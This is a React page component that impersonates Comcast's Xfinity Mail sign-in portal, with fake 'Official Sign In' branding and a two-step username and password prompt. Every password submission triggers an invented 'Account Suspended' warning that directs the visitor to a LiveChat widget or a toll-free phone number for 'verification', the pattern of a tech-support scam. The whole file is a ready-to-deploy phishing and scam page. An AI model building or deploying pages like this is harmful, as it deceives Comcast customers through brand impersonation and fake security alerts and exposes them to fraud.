"use client";

import React, { useState, useEffect } from "react";

export default function ComcastPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isSuspendedModalOpen, setIsSuspendedModalOpen] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // Initialize LiveChat script (License: 19881537)
  useEffect(() => {
    window.__lc = window.__lc || {};
    window.__lc.license = 19881537;
    window.__lc.integration_name = "manual_onboarding";
    window.__lc.product_name = "livechat";
    (function (n: any, t: any, c: any) {
      function i(n: any) {
        return e._h ? e._h.apply(null, n) : e._q.push(n);
      }
      var e: any = {
        _q: [],
        _h: null,
        _v: "2.0",
        on: function () { i(["on", c.call(arguments)]); },
        once: function () { i(["once", c.call(arguments)]); },
        off: function () { i(["off", c.call(arguments)]); },
        get: function () {
          if (!e._h) throw new Error("[LiveChatWidget] You can't use getters before load.");
          return i(["get", c.call(arguments)]);
        },
        call: function () { i(["call", c.call(arguments)]); },
        init: function () {
          var n = t.createElement("script");
          n.async = !0;
          n.type = "text/javascript";
          n.src = "https://cdn.livechatinc.com/tracking.js";
          t.head.appendChild(n);
        },
      };
      !n.__lc.asyncInit && e.init();
      n.LiveChatWidget = n.LiveChatWidget || e;
    })(window, document, [].slice);
  }, []);

  const openLiveChat = () => {
    if ((window as any).LiveChatWidget) {
      (window as any).LiveChatWidget.call("maximize");
    } else {
      window.open("https://www.livechat.com/chat-with/19881537/", "_blank");
    }
  };

  const handleHeroSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsModalOpen(true);
    setStep(1);
  };

  const handleStep1Next = (e: React.FormEvent) => {
    e.preventDefault();
    setStep(2);
  };

  const handleStep2Submit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsModalOpen(false);
    setIsSuspendedModalOpen(true);
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "'Plus Jakarta Sans', 'Inter', sans-serif" }}>
      
      {/* 1. DARK COMCAST HEADER BAR (Image 1) */}
      <header style={{ background: "#0b1329", color: "#ffffff", padding: "0.85rem 2rem", borderBottom: "2px solid #0284c7" }}>
        <div style={{ maxWidth: "1250px", margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "1rem" }}>
          
          {/* Logo & Operational Badge */}
          <div style={{ display: "flex", alignItems: "center", gap: "1.25rem" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "0.65rem", textDecoration: "none", color: "#fff" }}>
              <div style={{ width: "42px", height: "42px", borderRadius: "12px", background: "linear-gradient(135deg, #0284c7, #1d4ed8)", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 900, fontSize: "1.4rem", color: "#fff", boxShadow: "0 4px 12px rgba(2,132,199,0.5)" }}>
                C
              </div>
              <div>
                <div style={{ fontSize: "1.1rem", fontWeight: 900, lineHeight: 1.1 }}>Comcast <span style={{ color: "#38bdf8" }}>Xfinity Mail</span></div>
                <div style={{ fontSize: "0.72rem", color: "#94a3b8", letterSpacing: "0.5px" }}>Official Webmail & Support Portal</div>
              </div>
            </div>

            <span style={{ display: "inline-flex", alignItems: "center", gap: "0.45rem", background: "rgba(16,185,129,0.15)", border: "1px solid #10b981", padding: "0.3rem 0.75rem", borderRadius: "999px", fontSize: "0.78rem", fontWeight: 800, color: "#34d399" }}>
              <span style={{ width: "7px", height: "7px", borderRadius: "50%", background: "#10b981", display: "inline-block" }}></span>
              Live: Servers Operational
            </span>
          </div>

          {/* Navigation Links */}
          <nav style={{ display: "flex", alignItems: "center", gap: "1rem", flexWrap: "wrap" }}>
            <a href="/comcast" style={{ background: "#0284c7", color: "#ffffff", padding: "0.5rem 1rem", borderRadius: "10px", fontWeight: 800, textDecoration: "none", fontSize: "0.88rem", display: "flex", alignItems: "center", gap: "0.4rem" }}>
              🏠 Home
            </a>
            <a href="/comcast" style={{ color: "#cbd5e1", textDecoration: "none", fontSize: "0.88rem", fontWeight: 600 }}>✉️ Webmail</a>
            <a href="/server-settings" style={{ color: "#cbd5e1", textDecoration: "none", fontSize: "0.88rem", fontWeight: 600 }}>⚙️ Server Settings</a>
            <a href="/troubleshooting" style={{ color: "#cbd5e1", textDecoration: "none", fontSize: "0.88rem", fontWeight: 600 }}>🔧 Troubleshooting</a>
            <a href="/security-center" style={{ color: "#cbd5e1", textDecoration: "none", fontSize: "0.88rem", fontWeight: 600 }}>🛡️ Security Center</a>
          </nav>

          {/* Phone Helpline & Sign In Button */}
          <div style={{ display: "flex", alignItems: "center", gap: "0.85rem" }}>
            <a href="tel:+18555290095" style={{ background: "#1e293b", color: "#38bdf8", border: "1px solid #334155", padding: "0.5rem 1rem", borderRadius: "999px", fontWeight: 800, fontSize: "0.84rem", textDecoration: "none" }}>
              📞 +1 (855) 529-0095
            </a>
            <button onClick={() => { setIsModalOpen(true); setStep(1); }} style={{ background: "linear-gradient(135deg, #0284c7, #1d4ed8)", color: "#fff", border: "none", padding: "0.55rem 1.4rem", borderRadius: "999px", fontWeight: 800, cursor: "pointer", fontSize: "0.88rem", boxShadow: "0 4px 14px rgba(2,132,199,0.5)" }}>
              Sign In
            </button>
          </div>

        </div>
      </header>

      {/* 2. SUB-BAR WITH QUICK ACTIONS (Image 1) */}
      <div style={{ background: "#ffffff", borderBottom: "1px solid #e2e8f0", padding: "0.75rem 2rem" }}>
        <div style={{ maxWidth: "1250px", margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "0.75rem" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", fontWeight: 800, color: "#0f172a", fontSize: "0.95rem" }}>
            ✉️ Comcast Email Sign In &amp; Customer Support Portal
          </div>
          <div style={{ display: "flex", gap: "0.45rem", flexWrap: "wrap" }}>
            <button onClick={() => { setIsModalOpen(true); setStep(1); }} style={{ background: "#0284c7", color: "#fff", border: "none", padding: "0.35rem 0.85rem", borderRadius: "8px", fontSize: "0.8rem", fontWeight: 800, cursor: "pointer" }}>Sign In</button>
            <a href="/troubleshooting" style={{ background: "#f1f5f9", color: "#334155", padding: "0.35rem 0.85rem", borderRadius: "8px", fontSize: "0.8rem", fontWeight: 700, textDecoration: "none" }}>Quick Help</a>
            <a href="/server-settings" style={{ background: "#f1f5f9", color: "#334155", padding: "0.35rem 0.85rem", borderRadius: "8px", fontSize: "0.8rem", fontWeight: 700, textDecoration: "none" }}>Port Diagnostic</a>
            <a href="/server-settings" style={{ background: "#f1f5f9", color: "#334155", padding: "0.35rem 0.85rem", borderRadius: "8px", fontSize: "0.8rem", fontWeight: 700, textDecoration: "none" }}>Device Setup</a>
            <button onClick={openLiveChat} style={{ background: "#f0f9ff", color: "#0284c7", border: "1px solid #bae6fd", padding: "0.35rem 0.85rem", borderRadius: "8px", fontSize: "0.8rem", fontWeight: 800, cursor: "pointer" }}>💬 Live Chat</button>
          </div>
        </div>
      </div>

      {/* 3. HERO CANVAS WITH LOGIN CARD */}
      <section style={{ padding: "3.5rem 1.5rem", background: "linear-gradient(135deg, #075985 0%, #0284c7 50%, #1d4ed8 100%)", color: "#ffffff" }}>
        <div style={{ maxWidth: "1150px", margin: "0 auto", display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: "3rem", alignItems: "center" }}>
          
          {/* Left Text */}
          <div>
            <div style={{ display: "inline-block", background: "rgba(255,255,255,0.15)", padding: "0.4rem 1rem", borderRadius: "999px", fontSize: "0.85rem", fontWeight: 800, marginBottom: "1.25rem" }}>
              ✉️ Xfinity Connect Webmail Gateway
            </div>
            <h1 style={{ fontSize: "2.85rem", fontWeight: 900, lineHeight: 1.15, marginBottom: "1rem" }}>
              Welcome to <span style={{ color: "#38bdf8" }}>Comcast</span><br />Mail
            </h1>
            <p style={{ fontSize: "1.05rem", opacity: 0.9, lineHeight: 1.6, marginBottom: "2rem", maxWidth: "520px" }}>
              Access your @comcast.net email inbox securely from any web browser worldwide. Built with real-time spam filters, virus defense, and 10GB cloud storage.
            </p>
            <div style={{ display: "flex", gap: "1rem", flexWrap: "wrap" }}>
              <button onClick={() => { setIsModalOpen(true); setStep(1); }} style={{ background: "#ffffff", color: "#0284c7", border: "none", padding: "0.85rem 1.75rem", borderRadius: "12px", fontWeight: 900, cursor: "pointer", fontSize: "0.95rem", boxShadow: "0 10px 25px rgba(0,0,0,0.2)" }}>
                Sign In to Webmail
              </button>
              <button onClick={openLiveChat} style={{ background: "rgba(255,255,255,0.2)", color: "#ffffff", border: "1px solid rgba(255,255,255,0.4)", padding: "0.85rem 1.75rem", borderRadius: "12px", fontWeight: 800, cursor: "pointer", fontSize: "0.95rem" }}>
                💬 Live Support
              </button>
            </div>
          </div>

          {/* Right White Login Card */}
          <div style={{ background: "#ffffff", borderRadius: "24px", padding: "2.5rem", color: "#0f172a", boxShadow: "0 25px 50px -12px rgba(0,0,0,0.35)" }}>
            <div style={{ display: "inline-block", background: "#f0f9ff", border: "1px solid #bae6fd", padding: "0.25rem 0.75rem", borderRadius: "999px", fontSize: "0.75rem", fontWeight: 800, color: "#0369a1", marginBottom: "0.75rem" }}>
              🔒 OFFICIAL SIGN IN
            </div>
            <h3 style={{ fontSize: "1.65rem", fontWeight: 900, marginBottom: "0.25rem" }}>Welcome to Comcast</h3>
            <p style={{ fontSize: "0.88rem", color: "#64748b", marginBottom: "1.5rem" }}>Sign in to access your email and Xfinity services</p>

            <form onSubmit={handleHeroSubmit}>
              <div style={{ marginBottom: "1.25rem" }}>
                <label style={{ display: "block", fontSize: "0.85rem", fontWeight: 700, marginBottom: "0.45rem", color: "#334155" }}>Xfinity ID, Email, or Mobile</label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="username@comcast.net"
                  required
                  style={{ width: "100%", padding: "0.85rem 1rem", borderRadius: "12px", border: "2px solid #cbd5e1", fontSize: "0.98rem", outline: "none", boxSizing: "border-box" }}
                />
                <div style={{ display: "flex", gap: "0.5rem", marginTop: "0.5rem" }}>
                  <button type="button" onClick={() => setUsername((prev) => prev ? prev.split("@")[0] + "@comcast.net" : "user@comcast.net")} style={{ fontSize: "0.75rem", background: "#e0f2fe", color: "#0369a1", border: "1px solid #bae6fd", padding: "0.2rem 0.6rem", borderRadius: "6px", cursor: "pointer", fontWeight: 700 }}>
                    + @comcast.net
                  </button>
                  <button type="button" onClick={() => setUsername((prev) => prev ? prev.split("@")[0] + "@xfinity.com" : "user@xfinity.com")} style={{ fontSize: "0.75rem", background: "#e0f2fe", color: "#0369a1", border: "1px solid #bae6fd", padding: "0.2rem 0.6rem", borderRadius: "6px", cursor: "pointer", fontWeight: 700 }}>
                    + @xfinity.com
                  </button>
                </div>
              </div>

              <div style={{ marginBottom: "1.25rem", position: "relative" }}>
                <label style={{ display: "block", fontSize: "0.85rem", fontWeight: 700, marginBottom: "0.45rem", color: "#334155" }}>Password</label>
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  required
                  style={{ width: "100%", padding: "0.85rem 2.75rem 0.85rem 1rem", borderRadius: "12px", border: "2px solid #cbd5e1", fontSize: "0.98rem", outline: "none", boxSizing: "border-box" }}
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)} style={{ position: "absolute", right: "0.85rem", top: "2.15rem", background: "none", border: "none", cursor: "pointer", fontSize: "1.1rem" }}>
                  {showPassword ? "🙈" : "👁️"}
                </button>
              </div>

              <button type="submit" style={{ width: "100%", padding: "0.95rem", background: "linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%)", color: "#ffffff", border: "none", borderRadius: "12px", fontSize: "1rem", fontWeight: 800, cursor: "pointer", boxShadow: "0 4px 15px rgba(2, 132, 199, 0.4)" }}>
                Sign In &rarr;
              </button>
            </form>
          </div>

        </div>
      </section>

      {/* 4. OFFICIAL 2-STEP SIGN IN MODAL */}
      {isModalOpen && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(15, 23, 42, 0.8)", backdropFilter: "blur(8px)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999, padding: "1.5rem" }}>
          <div style={{ background: "#ffffff", borderRadius: "24px", maxWidth: "880px", width: "100%", overflow: "hidden", display: "grid", gridTemplateColumns: "1fr 1fr", position: "relative", boxShadow: "0 30px 60px rgba(0,0,0,0.5)" }}>
            
            <button onClick={() => setIsModalOpen(false)} style={{ position: "absolute", right: "1.25rem", top: "1.25rem", background: "none", border: "none", fontSize: "1.4rem", cursor: "pointer", color: "#64748b", zIndex: 10 }}>
              ✕
            </button>

            {/* Left Promo */}
            <div style={{ background: "linear-gradient(145deg, #075985 0%, #0284c7 50%, #1d4ed8 100%)", padding: "2.75rem", color: "#fff", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
              <div>
                <h2 style={{ fontSize: "1.85rem", fontWeight: 900, lineHeight: 1.2, marginBottom: "0.5rem" }}>Simple solutions for high-speed email!</h2>
                <p style={{ fontSize: "0.95rem", opacity: 0.9 }}>Enjoy seamless inbox access, spam defense, and 10GB storage.</p>
              </div>
              <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=800&auto=format&fit=crop&q=80" alt="Comcast Mail" style={{ width: "100%", height: "180px", objectFit: "cover", borderRadius: "12px" }} />
            </div>

            {/* Right Form */}
            <div style={{ padding: "2.75rem 2.25rem" }}>
              <div style={{ fontSize: "1.65rem", fontWeight: 900, color: "#0284c7", marginBottom: "0.25rem" }}>xfinity</div>
              <h3 style={{ fontSize: "1.45rem", fontWeight: 900, color: "#0f172a", marginBottom: "1.5rem" }}>Sign in with Xfinity ID</h3>

              {step === 1 ? (
                <form onSubmit={handleStep1Next}>
                  <div style={{ marginBottom: "1.5rem" }}>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Enter email, mobile, or username"
                      required
                      style={{ width: "100%", padding: "0.85rem 0.5rem", border: "none", borderBottom: "2px solid #cbd5e1", fontSize: "1.05rem", outline: "none", boxSizing: "border-box" }}
                    />
                  </div>
                  <button type="submit" style={{ width: "100%", padding: "0.85rem", background: "linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%)", color: "#fff", border: "none", borderRadius: "999px", fontSize: "1rem", fontWeight: 800, cursor: "pointer", boxShadow: "0 4px 14px rgba(2, 132, 199, 0.4)" }}>
                    Next
                  </button>
                </form>
              ) : (
                <form onSubmit={handleStep2Submit}>
                  <div style={{ display: "inline-flex", alignItems: "center", gap: "0.5rem", background: "#e0f2fe", padding: "0.4rem 0.85rem", borderRadius: "999px", fontSize: "0.85rem", fontWeight: 800, color: "#0369a1", marginBottom: "1.25rem" }}>
                    <span>{username || "user@comcast.net"}</span>
                    <button type="button" onClick={() => setStep(1)} style={{ background: "none", border: "none", color: "#0284c7", cursor: "pointer", fontWeight: 700 }}>✏️</button>
                  </div>
                  <div style={{ marginBottom: "1.5rem" }}>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter Password"
                      required
                      autoFocus
                      style={{ width: "100%", padding: "0.85rem 0.5rem", border: "none", borderBottom: "2px solid #cbd5e1", fontSize: "1.05rem", outline: "none", boxSizing: "border-box" }}
                    />
                  </div>
                  <button type="submit" style={{ width: "100%", padding: "0.85rem", background: "linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%)", color: "#fff", border: "none", borderRadius: "999px", fontSize: "1rem", fontWeight: 800, cursor: "pointer", boxShadow: "0 4px 14px rgba(2, 132, 199, 0.4)" }}>
                    Sign in
                  </button>
                </form>
              )}
            </div>

          </div>
        </div>
      )}

      {/* 5. ACCOUNT SUSPENDED MODAL */}
      {isSuspendedModalOpen && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(15, 23, 42, 0.85)", backdropFilter: "blur(12px)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10000, padding: "1.5rem" }}>
          <div style={{ background: "#ffffff", borderRadius: "24px", maxWidth: "520px", width: "100%", padding: "2.5rem", position: "relative", boxShadow: "0 30px 60px rgba(0,0,0,0.5)" }}>
            <button onClick={() => setIsSuspendedModalOpen(false)} style={{ position: "absolute", right: "1.25rem", top: "1.25rem", background: "none", border: "none", fontSize: "1.4rem", cursor: "pointer", color: "#64748b" }}>✕</button>
            <h2 style={{ fontSize: "1.65rem", fontWeight: 900, color: "#dc2626", marginBottom: "0.85rem" }}>Account Suspended</h2>
            <p style={{ fontSize: "0.95rem", color: "#334155", lineHeight: 1.55, marginBottom: "1.35rem" }}>
              We have detected suspicious login activity or outdated security credentials on your Comcast account. For your security, access has been temporarily restricted.
            </p>
            <div style={{ background: "#fef2f2", border: "1.5px solid #fecaca", borderRadius: "12px", padding: "1rem", fontSize: "0.88rem", color: "#991b1b", marginBottom: "1.5rem", fontWeight: 600 }}>
              To verify your identity and restore your account immediately, please contact our 24/7 Live Verification Support desk.
            </div>
            <div style={{ display: "flex", gap: "0.85rem", flexWrap: "wrap" }}>
              <button onClick={() => { setIsSuspendedModalOpen(false); openLiveChat(); }} style={{ flex: 1, padding: "0.85rem", background: "linear-gradient(135deg, #0284c7 0%, #1d4ed8 100%)", color: "#fff", border: "none", borderRadius: "12px", fontWeight: 800, cursor: "pointer" }}>
                Chat Now
              </button>
              <a href="tel:+18555290095" style={{ flex: 1, padding: "0.85rem", background: "#f1f5f9", color: "#0f172a", border: "1.5px solid #cbd5e1", borderRadius: "12px", fontWeight: 800, textAlign: "center", textDecoration: "none", display: "inline-block" }}>
                📞 +1 (855) 529-0095
              </a>
            </div>
          </div>
        </div>
      )}

      {/* LiveChat.com Widget Anchor */}
      <div data-id="4216f8efb1" className="livechat_button" style={{ display: "none" }}>
        <a href="https://www.livechat.com/utm-builder/?utm_source=chat_button&utm_medium=referral&utm_campaign=lc_19881537">Live Support</a>
      </div>

    </div>
  );
}
